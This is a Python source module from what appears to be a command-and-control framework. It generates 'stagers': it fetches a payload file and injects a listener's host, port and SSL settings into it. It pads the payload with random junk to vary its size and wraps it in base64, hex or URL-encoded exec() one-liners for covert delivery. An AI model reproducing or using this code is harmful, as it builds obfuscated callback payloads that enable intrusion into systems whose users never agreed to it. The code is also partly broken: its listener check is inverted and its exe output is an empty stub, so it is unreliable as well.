"""Create Stagers to download or copy"""
import random
import base64
import string
import json
from binascii import hexlify
import urllib.parse
from Database import db_session, StagerModel, ListenerModel
from .options import AVAILABLE_STAGERS

def add_stager(name: str, listener_id: int,
               encoding: str = "base64",
               random_size: bool = False,
               timeout: int = 5000,
               stager_format: str = "py",
               delay: int = 1) -> any:
    """
    Add a stager to the database
    :name: The Name of the stager
    :listener_id: The Listener to use
    :encoding: The encoding to use
    :random_size: Randomize the size of the payload
    :timeout: How often the stager should try to connect before exiting
    :stager_format: The format of the payload
    :delay: How long to wait before starting the stager
    """

    # Check if name is already in use
    stager: StagerModel = db_session.query(
        StagerModel).filter_by(name=name).first()
    if stager is not None:
        raise Exception(f"Stager {name} already exists")

    # Check if listener exists
    listener: ListenerModel = db_session.query(
        ListenerModel).filter_by(listener_id=listener_id).first()
    if listener is not None:
        raise Exception(f"Listener with ID {listener.listener_id} doesn't exist.")
    
    # Save the Stager to the Database
    stager = StagerModel(
        name=name,
        listener_id=listener_id,
        encoding=encoding,
        random_size=random_size,
        timeout=timeout,
        stager_format=stager_format,
        delay=delay
    )
    db_session.add(stager)
    db_session.commit()
    return "Created Stager successfully!"


def get_stager(stager_db: StagerModel, one_liner: bool = True) -> str:
    """
    Get Content of a Stager to download or copy

    :param stager_id: The ID of the Stager
    :param one_liner: Return Stager as one-liner
    :return: The Stager as a string

    """


    listener: ListenerModel = db_session.query(
        ListenerModel).filter_by(listener_id=stager_db.listener_id).first()

    if listener is None:
        raise Exception("Couldn't find the listener.")
    if listener.listener_type not in AVAILABLE_STAGERS: # also works as the stager type
        raise Exception(f"Stager {listener.listener_type} is not available.")
    # Get the Payload from the File
    try:
        with open("Payloads/" + listener.listener_type + ".py", "r") as f:
            payload = f.read()
    except:
        raise Exception("Couldn't find the payload.")

    # Randomize the Payload
    if stager_db.random_size:
        start = "".join(random.choices(string.ascii_letters, k=random.randint(5, 10))) + " = " + \
            "'" + "".join(random.choices(string.ascii_letters +
                          string.digits, k=random.randint(100, 500))) + "'"
        end = "".join(random.choices(string.ascii_letters, k=random.randint(5, 10))) + " = " + \
            "'" + "".join(random.choices(string.ascii_letters +
                          string.digits, k=random.randint(100, 500))) + "'"
    else:
        start = ""
        end = ""

    # Replace the Payload
    finished_payload = start + "\n"
    finished_payload += f"import time\ntime.sleep({stager_db.delay})\n"
    finished_payload += f"HOST = '{listener.address}'\n" \
        f"PORT = {listener.port}\n" \
        f"TIMEOUT = {stager_db.timeout}\n" \
        f"SSL={listener.ssl}\n"
    finished_payload += payload + "\n" + end

    # Encode the Payload
    if not one_liner and not stager_db.stager_format == "exe":
        if stager_db.encoding == "base64":
            finished_payload = base64.b64encode(
                finished_payload.encode()).decode()
        elif stager_db.encoding == "hex":
            finished_payload = hexlify(finished_payload.encode()).decode()
        elif stager_db.encoding == "url":
            finished_payload = urllib.parse.quote(finished_payload)
        elif stager_db.encoding == "raw":
            pass
        else:
            raise Exception("Encoding not supported")
    else:
        if stager_db.encoding == "base64":
            finished_payload = "import base64;" \
                "exec(base64.b64decode(b'%s'))" % base64.b64encode(
                finished_payload.encode()).decode()
        elif stager_db.encoding == "hex":
            finished_payload = "from binascii import unhexlify;exec(unhexlify('%s'))" % hexlify(
                finished_payload.encode()).decode()
        elif stager_db.encoding == "url":
            finished_payload = "import urllib.parse;" \
            "exec(urllib.parse.unquote('%s'))""" % urllib.parse.quote(
                finished_payload)
        elif stager_db.encoding == "raw":
            pass
        else:
            raise Exception("encoding not supported")

    if stager_db.stager_format == "py":
        return finished_payload
    elif stager_db.stager_format == "exe":
        # Create the EXE
        pass
    else:
        raise Exception("Unknown Format")
